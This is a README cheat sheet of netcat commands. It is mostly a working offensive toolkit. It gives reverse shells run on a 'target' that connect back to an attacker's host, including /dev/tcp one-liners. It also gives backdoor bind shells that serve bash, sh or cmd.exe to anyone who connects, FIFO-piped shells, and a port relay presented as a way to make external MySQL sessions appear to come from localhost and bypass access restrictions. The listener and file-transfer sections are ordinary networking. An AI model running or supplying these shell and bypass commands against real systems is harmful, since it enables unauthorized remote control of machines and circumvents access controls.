# netcat-utils
Useful netcat commands such as Reverse Shells, Port Relays via FIFO, and others stuff.



### Listener ###
Listen for inbound connection over TCP. This can be used to receive reverse shell sessions.
```
nc -lv -p [port]
```




### Connections ###
Initiate an outbound connection over TCP to a `[host]` which is listening on that `[port]`.
```
nc [host] [port]
```




### Reverse Shells ###
Run the following commands on a target which attempt to connect over TCP to the `[host]`. Host must be listening on `[port]`, _see above_.
```
nc [host] [port] -e /bin/bash
nc [host] [port] -e /bin/sh
nc [host] [port] -e cmd.exe
```




### Backdoor Shells ###
Same commands as before but in this case the target creates a listener which serves up a shell to anyone connecting on that `[port]`.
```
nc -l -p [port] -e /bin/bash
nc -l -p [port] -e /bin/sh
nc -l -p [port] -e cmd.exe
```




### Reverse Shell without Netcat on Target ###
As with the previous reverse shells, the `host` should be listening on the `port` sepecified for the callback to be successful.
```
bash -i >& /dev/tcp/[host]/[port] 0>&1
sh -i >& /dev/tcp/[host]/[port] 0>&1
python -i >& /dev/tcp/[host]/[port] 0>&1
```




### Relay / Port Redirection ###

**Create FIFO**

First in First Out, also known as named pipes, created by using `mknod p`. The `p` flag == type FIFO.
```
mknod [pipe-name] p
```

**Relay**

Create a loopback which will relay traffic between `localhost:[Port-A]` and `localhost:[Port-B]` on the target, allowing inbound connections to `localhost:[Port-B]` to be directed at `[Port-A]`.
```
nc -l -p [Port-B] 0< [pipe-name] | nc localhost [Port-A] 1> [pipe-name]
```
First netcat is used to create a listener on `[Port-B]` which we will direct Stdin `0<` to the named-pipe. Then forward the output of this listener via the tranditional pipe to the netcat connection to `[Port-A]`. Direct whatever service is listening on `[Port-A]` Stdout `1>` to the named-pipe, which will send the response back through the listener.

**Examples:**

MySQL by default listens on Port 3306, this will fool mysqld into thinking the connecting user is `user@localhost`! Many web apps only permit users from localhost and communicate via loopback connections to backend databases while not exposing the port to the outside; this would bypass that allowing external mysql client sessions that appear to originate from localhost.
Target: `nc -l -p [Port-B] 0< [pipe-name] | nc 127.0.0.1 3306 1> [pipe-name]`
Connection: `mysql --port [Port-B] --username=[user] --password=[passwd]`
Unfortunately the default `secure_mysql_installation` option "Prevent root from outside" will still disable `root`@`localhost` to connect in this manor.

FIFO's can also be used to connect to shells.
```
nc -l -p [port] 0< [pipe-name] | bash -i 1> [pipe-name]
nc -l -p [port] 0< [pipe-name] | sh -i 1> [pipe-name]
nc -l -p [port] 0< [pipe-name] | python -i 1> [pipe-name]
```




### File Transfer ###
Files can be transmitted across a netcat session using Stdin/Stdout.

Destination: `nc -l -p [port] > /path/to/file`

Source: `nc [host] [port] < path/to/file`

